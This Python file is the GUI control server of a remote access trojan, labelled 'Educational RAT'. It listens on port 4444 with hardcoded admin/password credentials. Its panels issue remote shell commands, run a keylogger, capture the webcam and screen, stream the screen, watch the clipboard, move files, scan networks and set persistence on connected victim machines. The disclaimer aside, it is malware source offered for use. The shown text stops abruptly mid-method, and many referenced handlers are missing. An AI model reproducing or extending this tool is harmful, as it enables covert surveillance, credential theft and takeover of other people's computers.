#!/usr/bin/env python3
# Educational RAT GUI Server - Full Featured
# For learning purposes only - use in controlled test environments

import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import socket
import os
import sys
import threading
import platform
import time
import json
import logging
import shutil
import re
import subprocess
import io

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from crypto_utils import send_msg, recv_msg, recv_msg_str, derive_key, AES_AVAILABLE
except ImportError:
    AES_AVAILABLE = False
    import struct
    def send_msg(sock, data, key=None):
        if isinstance(data, str): data = data.encode()
        sock.sendall(struct.pack('>I', len(data)) + data)
    def recv_msg(sock, key=None):
        raw = b""
        while len(raw) < 4:
            c = sock.recv(4 - len(raw))
            if not c: return None
            raw += c
        n = struct.unpack('>I', raw)[0]
        if n == 0: return b""
        if n > 50_000_000: return None
        data = b""
        while len(data) < n:
            c = sock.recv(min(65536, n - len(data)))
            if not c: return None
            data += c
        return data
    def recv_msg_str(sock, key=None):
        d = recv_msg(sock, key)
        return d.decode(errors='replace') if d is not None else None
    def derive_key(password): return None

try:
    from PIL import Image, ImageTk
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    from report_generator import PentestReport
    REPORT_AVAILABLE = True
except ImportError:
    REPORT_AVAILABLE = False

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler("server_log.txt"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

AUTH_USERNAME = "admin"
AUTH_PASSWORD = "password"
ENCRYPTION_KEY = "edu_rat_default_key"


class RATServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Educational RAT Server - EDUCATIONAL USE ONLY")
        self.root.geometry("1200x800")
        self.root.minsize(1000, 700)

        # Palette modernisée — 3 niveaux de profondeur
        self.bg_main       = "#0f1117"   # fond général
        self.bg_sidebar    = "#141824"   # sidebar
        self.bg_card       = "#1a1e2e"   # cards / panels
        self.bg_console    = "#080b10"   # console
        self.bg_input      = "#1e2433"   # inputs
        self.border_color  = "#1e2433"   # bordures subtiles
        self.text_color    = "#eceff4"   # texte principal
        self.text_muted    = "#4c566a"   # texte inactif / labels
        self.accent_color  = "#88c0d0"   # cyan accent
        self.warning_color = "#ebcb8b"   # jaune
        self.error_color   = "#bf616a"   # rouge
        self.success_color = "#a3be8c"   # vert
        self.info_color    = "#5e81ac"   # bleu
        self.orange_color  = "#d08770"   # orange (timeout)
        self.bg_color = self.bg_main     # alias backwards-compat

        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.root.configure(bg=self.bg_main)
        self.style.configure("TFrame",       background=self.bg_main)
        self.style.configure("Card.TFrame",  background=self.bg_card)
        self.style.configure("Sidebar.TFrame", background=self.bg_sidebar)
        self.style.configure("TLabel",       background=self.bg_main,    foreground=self.text_color,   font=("Segoe UI", 10))
        self.style.configure("Muted.TLabel", background=self.bg_main,    foreground=self.text_muted,   font=("Segoe UI", 9))
        self.style.configure("Bold.TLabel",  background=self.bg_main,    foreground=self.text_color,   font=("Segoe UI", 12, "bold"))
        self.style.configure("Header.TLabel",background=self.bg_card,    foreground=self.accent_color, font=("Segoe UI", 14, "bold"))
        self.style.configure("Status.TLabel",background=self.bg_main,    foreground=self.success_color,font=("Segoe UI", 10))
        self.style.configure("Warning.TLabel",background=self.bg_main,   foreground=self.warning_color,font=("Segoe UI", 12, "bold"))
        self.style.configure("Defense.TLabel",background=self.bg_card,   foreground="#81A1C1",         font=("Segoe UI", 10))
        self.style.configure("TButton",      background=self.accent_color,foreground=self.bg_main,     font=("Segoe UI", 9, "bold"), padding=4)
        self.style.map("TButton",
            background=[("active", "#6aafc0"), ("disabled", self.bg_input)],
            foreground=[("disabled", self.text_muted)])
        self.style.configure("Danger.TButton", background=self.error_color, foreground=self.bg_main, font=("Segoe UI", 9, "bold"), padding=4)
        self.style.map("Danger.TButton",
            background=[("active", "#a94452"), ("disabled", self.bg_input)],
            foreground=[("disabled", self.text_muted)])
        self.style.configure("TEntry",       fieldbackground=self.bg_input, foreground=self.text_color, insertcolor=self.text_color, borderwidth=1, relief="flat")
        self.style.configure("TNotebook",    background=self.bg_main)
        self.style.configure("TScrollbar",   background=self.bg_sidebar, troughcolor=self.bg_main, arrowcolor=self.text_muted)
        self.style.configure("Build.Horizontal.TProgressbar",
            troughcolor=self.bg_input, background=self.accent_color,
            borderwidth=0, thickness=6)

        self.clients = {}
        self.current_client_id = None
        self.server_socket = None
        self.stop_flag = threading.Event()
        self.lock = threading.Lock()
        self.streaming = False
        self._sidebar_buttons = {}      # slug -> (frame, icon_lbl, text_lbl)
        self._content_frames = {}       # slug -> frame contenu
        self._active_section = None     # slug actif
        self._notif_widgets = []        # widgets notification actifs

        self.server_host = tk.StringVar(value="0.0.0.0")
        self.server_port = tk.IntVar(value=4444)
        self.build_exe_var = tk.BooleanVar(value=False)
        self.lan_mode_var = tk.BooleanVar(value=True)
        self.auth_username_var = tk.StringVar(value=AUTH_USERNAME)
        self.auth_password_var = tk.StringVar(value=AUTH_PASSWORD)
        self.auto_generate_var = tk.BooleanVar(value=True)
        self.save_to_builds_var = tk.BooleanVar(value=True)

        self.status_var = tk.StringVar(value="Server: Stopped")
        self.count_var = tk.StringVar(value="Clients: 0")

        self.screenshots = []
        self.current_screenshot_index = 0
        self.screenshot_photo = None
        self.webcam_images = []
        self.current_webcam_index = 0
        self.webcam_photo = None
        self.stream_photo = None

        if REPORT_AVAILABLE:
            self.report = PentestReport()
        else:
            self.report = None

        self._build_ui()
        self.log_message("Educational RAT Server - All features loaded", "info")
        self.log_message(f"Encryption: {'AES-256 available' if AES_AVAILABLE else 'Fallback (no pycryptodome)'}", "info")
        self.log_message(f"Report generator: {'Available' if REPORT_AVAILABLE else 'Unavailable (pip install fpdf2)'}", "info")
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def _build_ui(self):
        self._build_titlebar()
        body = tk.Frame(self.root, bg=self.bg_main)
        body.pack(fill="both", expand=True)
        self._build_sidebar(body)
        self._build_content_area(body)
        self._setup_dashboard(self._content_frames["dashboard"])
        self._setup_terminal(self._content_frames["terminal"])
        self._setup_clients(self._content_frames["clients"])
        self._setup_stream(self._content_frames["stream"])
        self._setup_screenshots(self._content_frames["screenshots"])
        self._setup_webcam(self._content_frames["webcam"])
        self._setup_keylogger(self._content_frames["keylogger"])
        self._setup_clipboard(self._content_frames["clipboard"])
        self._setup_files(self._content_frames["files"])
        self._setup_scanner(self._content_frames["scanner"])
        self._setup_persistence(self._content_frames["persistence"])
        self._setup_sysinfo(self._content_frames["sysinfo"])
        self._setup_settings(self._content_frames["settings"])
        self._setup_defense(self._content_frames["defense"])
        self._setup_report(self._content_frames["report"])
        self._setup_help(self._content_frames["help"])
        self._show_section("dashboard")

    def _build_titlebar(self):
        bar = tk.Frame(self.root, bg="#0a0d13", height=36)
        bar.pack(fill="x")
        bar.pack_propagate(False)
        left = tk.Frame(bar, bg="#0a0d13")
        left.pack(side="left", padx=12, fill="y")
        tk.Label(left, text="⬡", fg=self.error_color, bg="#0a0d13",
                 font=("Segoe UI", 14)).pack(side="left", pady=6)
        tk.Label(left, text="EduRAT Console", fg=self.text_color, bg="#0a0d13",
                 font=("Segoe UI", 11, "bold")).pack(side="left", padx=6, pady=6)
        self._status_badge = tk.Label(left, text="● ARRÊTÉ", fg=self.error_color,
                                       bg="#0a0d13", font=("Segoe UI", 8),
                                       padx=7, pady=1)
        self._status_badge.pack(side="left", padx=4)
        right = tk.Frame(bar, bg="#0a0d13")
        right.pack(side="right", padx=12, fill="y")
        self._clients_badge = tk.Label(right, text="0 clients", fg=self.text_muted,
                                        bg="#0a0d13", font=("Segoe UI", 9))
        self._clients_badge.pack(side="right", pady=6)
        self._port_badge = tk.Label(right, text=":4444", fg=self.accent_color,
                                     bg=self.bg_input, font=("Consolas", 8),
                                     padx=6, pady=2)
        self._port_badge.pack(side="right", padx=8, pady=6)
        self._alert_badge = tk.Label(right, text="", fg=self.warning_color,
                                      bg="#0a0d13", font=("Segoe UI", 8),
                                      padx=7, pady=1)
        self._alert_badge.pack(side="right", padx=4)
        self._alert_count = 0
        self._alert_log = []          # list of (timestamp_str, msg, level)
        self._server_start_time = None
        self._total_connections = 0

    def _build_sidebar(self, parent):
        sidebar = tk.Frame(parent, bg=self.bg_sidebar, width=165)
        sidebar.pack(side="left", fill="y")
        sidebar.pack_propagate(False)
        sep = tk.Frame(parent, bg=self.border_color, width=1)
        sep.pack(side="left", fill="y")
        groups = [
            ("CONTRÔLE", [
                ("dashboard",   "⚡", "Dashboard"),
                ("terminal",    "\U0001f5a5", "Terminal"),
                ("clients",     "\U0001f465", "Clients"),
            ]),
            ("SURVEILLANCE", [
                ("stream",      "\U0001f4fa", "Écran / Stream"),
                ("screenshots", "\U0001f4f8", "Screenshots"),
                ("webcam",      "\U0001f4f7", "Webcam"),
                ("keylogger",   "⌨", "Keylogger"),
                ("clipboard",   "\U0001f4cb", "Presse-papier"),
            ]),
            ("FICHIERS", [
                ("files",       "\U0001f4c2", "Transfert"),
            ]),
            ("RÉSEAU & SYSTÈME", [
                ("scanner",     "\U0001f310", "Scanner réseau"),
                ("persistence", "\U0001f512", "Persistance"),
                ("sysinfo",     "\U0001f4bb", "Info système"),
            ]),
        ]
        bottom_items = [
            ("settings",  "⚙", "Paramètres"),
            ("defense",   "\U0001f6e1", "Défense"),
            ("report",    "\U0001f4c4", "Rapports"),
            ("help",      "❓", "Aide"),
        ]
        scroll_frame = tk.Frame(sidebar, bg=self.bg_sidebar)
        scroll_frame.pack(fill="both", expand=True, pady=6)
        for group_label, items in groups:
            tk.Label(scroll_frame, text=group_label, fg=self.text_muted,
                     bg=self.bg_sidebar, font=("Segoe UI", 7),
                     anchor="w", padx=10).pack(fill="x", pady=(8, 2))
            for slug, icon, label in items:
                self._make_sidebar_item(scroll_frame, slug, icon, label)
        tk.Frame(sidebar, bg=self.border_color, height=1).pack(fill="x", pady=4)
        bottom_frame = tk.Frame(sidebar, bg=self.bg_sidebar)
        bottom_frame.pack(fill="x", pady=2)
        for slug, icon, label in bottom_items:
            self._make_sidebar_item(bottom_frame, slug, icon, label)

    def _make_sidebar_item(self, parent, slug, icon, label):
        frame = tk.Frame(parent, bg=self.bg_sidebar, cursor="hand2")
        frame.pack(fill="x", padx=6, pady=1)
        icon_lbl = tk.Label(frame, text=icon, bg=self.bg_sidebar,
                            fg=self.text_muted, font=("Segoe UI", 10), width=2)
        icon_lbl.pack(side="left", padx=(4, 2), pady=4)
        text_lbl = tk.Label(frame, text=label, bg=self.bg_sidebar,
                            fg=self.text_muted, font=("Segoe UI", 9), anchor="w")
        text_lbl.pack(side="left", fill="x", expand=True, pady=4)
        for widget in (frame, icon_lbl, text_lbl):
            widget.bind("<Button-1>", lambda e, s=slug: self._show_section(s))
            widget.bind("<Enter>",    lambda e, f=frame, il=icon_lbl, tl=text_lbl: self._sidebar_hover(f, il, tl, True))
            widget.bind("<Leave>",    lambda e, f=frame, il=icon_lbl, tl=text_lbl, s=slug: self._sidebar_hover(f, il, tl, False, s))
        self._sidebar_buttons[slug] = (frame, icon_lbl, text_lbl)

    def _sidebar_hover(self, frame, icon_lbl, text_lbl, entering, slug=None):
        if slug and slug == self._active_section:
            return
        bg = self.bg_input if entering else self.bg_sidebar
        fg = self.text_color if entering else self.text_muted
        frame.config(bg=bg)
        icon_lbl.config(bg=bg, fg=fg)
        text_lbl.config(bg=bg, fg=fg)

    def _build_content_area(self, parent):
        content_outer = tk.Frame(parent, bg=self.bg_main)
        content_outer.pack(side="left", fill="both", expand=True)
        self._notif_zone = tk.Frame(content_outer, bg=self.bg_main)
        self._notif_zone.pack(fill="x", padx=10, pady=(6, 0))
        self._content_stack = tk.Frame(content_outer, bg=self.bg_main)
        self._content_stack.pack(fill="both", expand=True, padx=10, pady=6)
        slugs = ["dashboard", "terminal", "clients", "stream", "screenshots",
                 "webcam", "keylogger", "clipboard", "files", "scanner",
                 "persistence", "sysinfo", "settings", "defense", "report", "help"]
        for slug in slugs:
            f = tk.Frame(self._content_stack, bg=self.bg_main)
            f.place(relwidth=1, relheight=1)
            f.lower()
            self._content_frames[slug] = f

    def _show_section(self, slug):
        if self._active_section and self._active_section in self._sidebar_buttons:
            frame, icon_lbl, text_lbl = self._sidebar_buttons[self._active_section]
            frame.config(bg=self.bg_sidebar)
            icon_lbl.config(bg=self.bg_sidebar, fg=self.text_muted)
            text_lbl.config(bg=self.bg_sidebar, fg=self.text_muted)
        self._active_section = slug
        if slug in self._sidebar_buttons:
            frame, icon_lbl, text_lbl = self._sidebar_buttons[slug]
            frame.config(bg=self.bg_input)
            icon_lbl.config(bg=self.bg_input, fg=self.accent_color)
            text_lbl.config(bg=self.bg_input, fg=self.text_color)
        if slug in self._content_frames:
            self._content_frames[slug].lift()

    # ═══════════════════════════════════════════════════════════════════
    # DASHBOARD
    # ═══════════════════════════════════════════════════════════════════

    def _setup_dashboard(self, parent):
        parent.configure(bg=self.bg_main)
        self._stats_row = tk.Frame(parent, bg=self.bg_main)
        self._stats_row.pack(fill="x", pady=(0, 0))
        self._stat_clients = self._make_stat_card(self._stats_row, "0",    "CLIENTS", self.success_color, lambda: self._toggle_detail("clients"))
        self._stat_server  = self._make_stat_card(self._stats_row, "OFF",  "SERVEUR", self.error_color,   lambda: self._toggle_detail("server"))
        self._stat_alerts  = self._make_stat_card(self._stats_row, "0",    "ALERTES", self.warning_color, lambda: self._toggle_detail("alerts"))
        self._stat_port    = self._make_stat_card(self._stats_row, "4444", "PORT",    self.accent_color,  lambda: self._toggle_detail("port"))

        # Inline detail panel — starts hidden, inserted after stats_row on demand
        self._detail_panel = tk.Frame(parent, bg=self.bg_card,
                                      highlightbackground=self.accent_color, highlightthickness=1)
        self._detail_panel_active = None  # which card is open

        clients_frame = tk.Frame(parent, bg=self.bg_card,
                                  highlightbackground=self.border_color, highlightthickness=1)
        clients_frame.pack(fill="x", pady=(0, 8))
        tk.Label(clients_frame, text="CLIENTS CONNECTÉS", fg=self.text_muted,
                 bg=self.bg_card, font=("Segoe UI", 7), anchor="w",
                 padx=10).pack(fill="x", pady=(6, 2))
        lf = tk.Frame(clients_frame, bg=self.bg_card)
        lf.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        self.client_listbox = tk.Listbox(lf, bg=self.bg_input, fg=self.text_color,
                                          font=("Consolas", 9), selectbackground=self.accent_color,
                                          selectforeground=self.bg_main, borderwidth=0,
                                          highlightthickness=0, activestyle="none")
        self.client_listbox.pack(side="left", fill="both", expand=True)
        sb = tk.Scrollbar(lf, orient="vertical", command=self.client_listbox.yview,
                           bg=self.bg_sidebar, troughcolor=self.bg_main)
        sb.pack(side="right", fill="y")
        self.client_listbox.config(yscrollcommand=sb.set)
        self.client_listbox.bind("<Button-3>", self._client_context_menu)

        btn_row = tk.Frame(clients_frame, bg=self.bg_card)
        btn_row.pack(fill="x", padx=8, pady=(0, 8))
        ttk.Button(btn_row, text="Actualiser",   command=self.refresh_clients).pack(side="left", padx=3)
        ttk.Button(btn_row, text="Connecter",    command=self.connect_to_client).pack(side="left", padx=3)
        ttk.Button(btn_row, text="Déconnecter", command=self.disconnect_selected,
                   style="Danger.TButton").pack(side="left", padx=3)
        ttk.Button(btn_row, text="Kick tous", command=self.disconnect_all,
                   style="Danger.TButton").pack(side="left", padx=3)
        self.start_btn = ttk.Button(btn_row, text="▶ Démarrer serveur", command=self.start_server)
        self.start_btn.pack(side="right", padx=3)
        self.stop_btn = ttk.Button(btn_row, text="■ Arrêter", command=self.stop_server,
                                    state="disabled", style="Danger.TButton")
        self.stop_btn.pack(side="right", padx=3)

        console_frame = tk.Frame(parent, bg=self.bg_card,
                                  highlightbackground=self.border_color, highlightthickness=1)
        console_frame.pack(fill="both", expand=True)
        tk.Label(console_frame, text="CONSOLE", fg=self.text_muted, bg=self.bg_card,
                 font=("Segoe UI", 7), anchor="w", padx=10).pack(fill="x", pady=(6, 2))
        self.console = tk.Text(console_frame, wrap="word", bg=self.bg_console,
                                fg=self.text_color, font=("Consolas", 9),
                                borderwidth=0, highlightthickness=0, state="disabled")
        csb = tk.Scrollbar(console_frame, orient="vertical", command=self.console.yview)
        csb.pack(side="right", fill="y")
        self.console.config(yscrollcommand=csb.set)
        self.console.pack(fill="both", expand=True, padx=8, pady=(0, 6))

    def _make_stat_card(self, parent, value, label, color, on_click=None):
        card = tk.Frame(parent, bg=self.bg_card,
                        highlightbackground=self.border_color, highlightthickness=1,
                        cursor="hand2" if on_click else "")
        card.pack(side="left", fill="both", expand=True, padx=(0, 6))
        val_lbl = tk.Label(card, text=value, fg=color, bg=self.bg_card,
                            font=("Segoe UI", 20, "bold"),
                            cursor="hand2" if on_click else "")
        val_lbl.pack(pady=(10, 2))
        hint = tk.Label(card, text=label + (" ▸" if on_click else ""),
                        fg=self.text_muted, bg=self.bg_card, font=("Segoe UI", 7),
                        cursor="hand2" if on_click else "")
        hint.pack(pady=(0, 10))
        if on_click:
            for w in (card, val_lbl, hint):
                w.bind("<Button-1>", lambda e: on_click())
                w.bind("<Enter>", lambda e, f=card: f.config(highlightbackground=self.accent_color))
                w.bind("<Leave>", lambda e, f=card: f.config(highlightbackground=self.border_color))
        return val_lbl

    # ═══════════════════════════════════════════════════════════════════
    # TERMINAL
    # ═══════════════════════════════════════════════════════════════════

    def _setup_terminal(self, parent):
        parent.configure(bg=self.bg_main)
        hdr = tk.Frame(parent, bg=self.bg_main)
        hdr.pack(fill="x", pady=(0, 8))
        tk.Label(hdr, text="Terminal", fg=self.accent_color, bg=self.bg_main,
                 font=("Segoe UI", 13, "bold")).pack(side="left")
        tk.Label(hdr, text="Envoie des commandes au client sélectionné",
                 fg=self.text_muted, bg=self.bg_main, font=("Segoe UI", 9)).pack(side="left", padx=10)
        out_frame = tk.Frame(parent, bg=self.bg_card,
                              highlightbackground=self.border_color, highlightthickness=1)
        out_frame.pack(fill="both", expand=True, pady=(0, 8))
        self.terminal_out = tk.Text(out_frame, wrap="word", bg=self.bg_console,
                                     fg=self.text_color, font=("Consolas", 10),
                                     borderwidth=0, highlightthickness=0, state="disabled")
        tsb = tk.Scrollbar(out_frame, orient="vertical", command=self.terminal_out.yview)
        tsb.pack(side="right", fill="y")
        self.terminal_out.config(yscrollcommand=tsb.set)
        self.terminal_out.pack(fill="both", expand=True, padx=6, pady=6)
        input_frame = tk.Frame(parent, bg=self.bg_card,
                                highlightbackground=self.border_color, highlightthickness=1)
        input_frame.pack(fill="x")
        tk.Label(input_frame, text="$", fg=self.success_color, bg=self.bg_card,
                 font=("Consolas", 12), padx=8).pack(side="left")
        self.cmd_entry = ttk.Entry(input_frame, font=("Consolas", 10))
        self.cmd_entry.pack(side="left", fill="x", expand=True, pady=6)
        self.cmd_entry.bind("<Return>", self.send_command)
        ttk.Button(input_frame, text="Envoyer", command=self.send_command).pack(side="right", padx=8, pady=6)

    # ═══════════════════════════════════════════════════════════════════
    # CLIENTS
    # ═══════════════════════════════════════════════════════════════════

    def _setup_clients(self, parent):
        parent.configure(bg=self.bg_main)
        hdr = tk.Frame(parent, bg=self.bg_main)
        hdr.pack(fill="x", pady=(0, 8))
        tk.Label(hdr, text="Clients connectés", fg=self.accent_color, bg=self.bg_main,
                 font=("Segoe UI", 13, "bold")).pack(side="left")
        ttk.Button(hdr, text="Actualiser", command=self.refresh_clients).pack(side="right")
        ttk.Button(hdr, text="Kick tous", command=self.disconnect_all,
                   style="Danger.TButton").pack(side="right", padx=(0, 6))

        # Column headers
        col_frame = tk.Frame(parent, bg=self.bg_input)
        col_frame.pack(fill="x")
        self._clients_col_widths = [4, 18, 16, 14, 12, 10, 10]
        for txt, w in zip(["#", "IP : PORT", "HOSTNAME", "OS", "CHIFFR.", "ACTIF", "ACTIONS"],
                          self._clients_col_widths):
            tk.Label(col_frame, text=txt, fg=self.text_muted, bg=self.bg_input,
                     font=("Segoe UI", 8, "bold"), width=w, anchor="w").pack(side="left", padx=4, pady=4)

        # Scrollable rows container
        outer = tk.Frame(parent, bg=self.bg_card,
                         highlightbackground=self.border_color, highlightthickness=1)
        outer.pack(fill="both", expand=True)
        canvas = tk.Canvas(outer, bg=self.bg_card, highlightthickness=0)
        sb = tk.Scrollbar(outer, orient="vertical", command=canvas.yview,
                          bg=self.bg_sidebar, troughcolor=self.bg_main)
        sb.pack(side="right", fill="y")
        canvas.pack(side="left", fill="both", expand=True)
        canvas.config(yscrollcommand=sb.set)
        self._clients_rows_frame = tk.Frame(canvas, bg=self.bg_card)
        self._clients_canvas_win = canvas.create_window((0, 0), window=self._clients_rows_frame, anchor="nw")
        self._clients_rows_frame.bind("<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.bind("<Configure>",
            lambda e: canvas.itemconfig(self._clients_canvas_win, width=e.width))
        self._clients_canvas = canvas

        # Empty state label
        self._clients_empty_lbl = tk.Label(self._clients_rows_frame,
            text="Aucun client connecté", fg=self.text_muted, bg=self.bg_card,
            font=("Segoe UI", 10))
        self._clients_empty_lbl.pack(pady=30)


    # ═══════════════════════════════════════════════════════════════════
    # LIVE STREAM
    # ═══════════════════════════════════════════════════════════════════

    def _setup_stream(self, parent):
        parent.configure(bg=self.bg_main)
        self._section_header(parent, "Écran / Stream", "Capture et streaming en direct")
        ctrl = tk.Frame(parent, bg=self.bg_main)
        ctrl.pack(fill="x", pady=(0, 8))
        self.stream_start_btn = ttk.Button(ctrl, text="▶ Démarrer stream", command=self.start_stream)
        self.stream_start_btn.pack(side="left", padx=5)
        self.stream_stop_btn = ttk.Button(ctrl, text="■ Arrêter", command=self.stop_stream,
                                           state="disabled", style="Danger.TButton")
        self.stream_stop_btn.pack(side="left", padx=5)
        self.stream_fps_label = tk.Label(ctrl, text="FPS: --", fg=self.success_color,
                                          bg=self.bg_main, font=("Segoe UI", 10))
        self.stream_fps_label.pack(side="right", padx=10)
        self.stream_canvas = tk.Canvas(parent, bg=self.bg_console, highlightthickness=0)
        self.stream_canvas.pack(fill="both", expand=True)

    # ═══════════════════════════════════════════════════════════════════
    # FILE OPERATIONS
    # ═══════════════════════════════════════════════════════════════════

    def _setup_files(self, parent):
        parent.configure(bg=self.bg_main)
        self._section_header(parent, "Transfert de fichiers", "Upload / Download vers le client")
        panel = tk.Frame(parent, bg=self.bg_main)
        panel.pack(fill="both", expand=True)

        left = tk.Frame(panel, bg=self.bg_card, highlightbackground=self.border_color, highlightthickness=1)
        left.pack(side="left", fill="both", expand=True, padx=(0, 4))
        tk.Label(left, text="FICHIERS LOCAUX", fg=self.text_muted, bg=self.bg_card,
                 font=("Segoe UI", 7), anchor="w", padx=8).pack(fill="x", pady=(6, 2))
        pf = tk.Frame(left, bg=self.bg_card)
        pf.pack(fill="x", padx=8, pady=3)
        self.local_path_var = tk.StringVar(value=os.getcwd())
        ttk.Entry(pf, textvariable=self.local_path_var, width=30).pack(side="left", fill="x", expand=True)
        ttk.Button(pf, text="Parcourir", command=self.browse_local_dir).pack(side="right", padx=(4, 0))
        lf = tk.Frame(left, bg=self.bg_card)
        lf.pack(fill="both", expand=True, padx=8, pady=3)
        self.local_files = tk.Listbox(lf, bg=self.bg_input, fg=self.text_color, font=("Consolas", 9),
                                       borderwidth=0, highlightthickness=0, selectbackground=self.accent_color,
                                       selectforeground=self.bg_main)
        lsb = tk.Scrollbar(lf, orient="vertical", command=self.local_files.yview,
                            bg=self.bg_sidebar, troughcolor=self.bg_main)
        lsb.pack(side="right", fill="y")
        self.local_files.config(yscrollcommand=lsb.set)
        self.local_files.pack(side="left", fill="both", expand=True)
        self.local_files.bind("<Double-Button-1>", self._local_navigate)
        btn_local = tk.Frame(left, bg=self.bg_card)
        btn_local.pack(fill="x", padx=8, pady=4)
        ttk.Button(btn_local, text="↑ Parent", command=self._local_go_up).pack(side="left", padx=(0, 4))
        ttk.Button(btn_local, text="Actualiser", command=self.refresh_local_files).pack(side="left")

        mid = tk.Frame(panel, bg=self.bg_main, width=90)
        mid.pack(side="left", fill="y", padx=4)
        tk.Label(mid, text="Transfert", fg=self.accent_color, bg=self.bg_main,
                 font=("Segoe UI", 9, "bold")).pack(pady=10)
        ttk.Button(mid, text="Upload >>", command=self.upload_file).pack(pady=5)
        ttk.Button(mid, text="<< Download", command=self.download_file).pack(pady=5)

        right = tk.Frame(panel, bg=self.bg_card, highlightbackground=self.border_color, highlightthickness=1)
        right.pack(side="right", fill="both", expand=True, padx=(4, 0))
        tk.Label(right, text="FICHIERS DISTANTS", fg=self.text_muted, bg=self.bg_card,
                 font=("Segoe UI", 7), anchor="w", padx=8).pack(fill="x", pady=(6, 2))
        rpf = tk.Frame(right, bg=self.bg_card)
        rpf.pack(fill="x", padx=8, pady=3)
        self.remote_path_var = tk.StringVar(value=".")
        ttk.Entry(rpf, textvariable=self.remote_path_var, width=30).pack(side="left", fill="x", expand=True)
        ttk.Button(rpf, text="Lister", command=self.list_remote_files).pack(side="right", padx=(4, 0))
        rf = tk.Frame(right, bg=self.bg_card)
        rf.pack(fill="both", expand=True, padx=8, pady=3)
        self.remote_files = tk.Listbox(rf, bg=self.bg_input, fg=self.text_color, font=("Consolas", 9),
                                        borderwidth=0, highlightthickness=0, selectbackground=self.accent_color,
                                        selectforeground=self.bg_main)
        rsb = tk.Scrollbar(rf, orient="vertical", command=self.remote_files.yview,
                            bg=self.bg_sidebar, troughcolor=self.bg_main)
        rsb.pack(side="right", fill="y")
        self.remote_files.config(yscrollcommand=rsb.set)
        self.remote_files.pack(side="left", fill="both", expand=True)
        self.remote_files.bind("<Double-Button-1>", self._remote_navigate)
        btn_remote = tk.Frame(right, bg=self.bg_card)
        btn_remote.pack(fill="x", padx=8, pady=4)
        ttk.Button(btn_remote, text="↑ Parent", command=self._remote_go_up).pack(side="left", padx=(0, 4))
        ttk.Button(btn_remote, text="Actualiser", command=self.list_remote_files).pack(side="left")

        self.refresh_local_files()

    # ═══════════════════════════════════════════════════════════════════
    # SCREENSHOTS
    # ═══════════════════════════════════════════════════════════════════

    def _setup_screenshots(self, parent):
        parent.configure(bg=self.bg_main)
        self._section_header(parent, "Screenshots", "Captures d'écran du client")
        ctrl = tk.Frame(parent, bg=self.bg_main)
        ctrl.pack(fill="x", pady=(0, 8))
        ttk.Button(ctrl, text="Capturer", command=self.capture_screenshot).pack(side="left", padx=5)
        ttk.Button(ctrl, text="Sauvegarder", command=self.save_screenshot).pack(side="left", padx=5)
        self.ss_canvas = tk.Canvas(parent, bg=self.bg_console, highlightthickness=0)
        self.ss_canvas.pack(fill="both", expand=True)
        nav = tk.Frame(parent, bg=self.bg_main)
        nav.pack(fill="x", pady=(8, 0))
        ttk.Button(nav, text="< Préc", command=self.prev_screenshot).pack(side="left")
        self.ss_label = tk.Label(nav, text="Aucun screenshot", fg=self.text_muted,
                                  bg=self.bg_main, font=("Segoe UI", 9))
        self.ss_label.pack(side="left", padx=20)
        ttk.Button(nav, text="Suiv >", command=self.next_screenshot).pack(side="left")

    # ═══════════════════════════════════════════════════════════════════
    # SYSINFO
    # ═══════════════════════════════════════════════════════════════════

    def _setup_sysinfo(self, parent):
        parent.configure(bg=self.bg_main)
        self._section_header(parent, "Info système", "Informations et capacités du client")
        ctrl = tk.Frame(parent, bg=self.bg_main)
        ctrl.pack(fill="x", pady=(0, 8))
        ttk.Button(ctrl, text="Rafraîchir", command=self.get_system_info).pack(side="left", padx=5)
        ttk.Button(ctrl, text="Capacités", command=self.get_capabilities).pack(side="left", padx=5)
        self.sysinfo_text = self._make_text_area(parent)

    # ═══════════════════════════════════════════════════════════════════
    # WEBCAM
    # ═══════════════════════════════════════════════════════════════════

    def _setup_webcam(self, parent):
        parent.configure(bg=self.bg_main)
        self._section_header(parent, "Webcam", "Capture webcam du client")
        ctrl = tk.Frame(parent, bg=self.bg_main)
        ctrl.pack(fill="x", pady=(0, 8))
        ttk.Button(ctrl, text="Capturer", command=self.capture_webcam).pack(side="left", padx=5)
        ttk.Button(ctrl, text="Sauvegarder", command=self.save_webcam).pack(side="left", padx=5)
        self.wc_canvas = tk.Canvas(parent, bg=self.bg_console, highlightthickness=0)
        self.wc_canvas.pack(fill="both", expand=True)
        nav = tk.Frame(parent, bg=self.bg_main)
        nav.pack(fill="x", pady=(8, 0))
        ttk.Button(nav, text="< Préc", command=lambda: self._nav_webcam(-1)).pack(side="left")
        self.wc_label = tk.Label(nav, text="Aucune image", fg=self.text_muted,
                                  bg=self.bg_main, font=("Segoe UI", 9))
        self.wc_label.pack(side="left", padx=20)
        ttk.Button(nav, text="Suiv >", command=lambda: self._nav_webcam(1)).pack(side="left")

    # ═══════════════════════════════════════════════════════════════════
    # KEYLOGGER
    # ═══════════════════════════════════════════════════════════════════

    def _setup_keylogger(self, parent):
        parent.configure(bg=self.bg_main)
        self._section_header(parent, "Keylogger", "Enregistrement des frappes clavier")
        ctrl = tk.Frame(parent, bg=self.bg_main)
        ctrl.pack(fill="x", pady=(0, 8))
        ttk.Button(ctrl, text="Démarrer", command=lambda: self._cmd_thread("keylogger_start")).pack(side="left", padx=3)
        ttk.Button(ctrl, text="Arrêter", command=lambda: self._cmd_thread("keylogger_stop")).pack(side="left", padx=3)
        ttk.Button(ctrl, text="Récupérer", command=self.dump_keylogger).pack(side="left", padx=3)
        ttk.Button(ctrl, text="Sauvegarder", command=self.save_keylogger).pack(side="left", padx=3)
        self.keylog_text = self._make_text_area(parent, readonly=False)

    # ═══════════════════════════════════════════════════════════════════
    # CLIPBOARD
    # ═══════════════════════════════════════════════════════════════════

    def _setup_clipboard(self, parent):
        parent.configure(bg=self.bg_main)
        self._section_header(parent, "Presse-papier", "Surveillance du clipboard")
        ctrl = tk.Frame(parent, bg=self.bg_main)
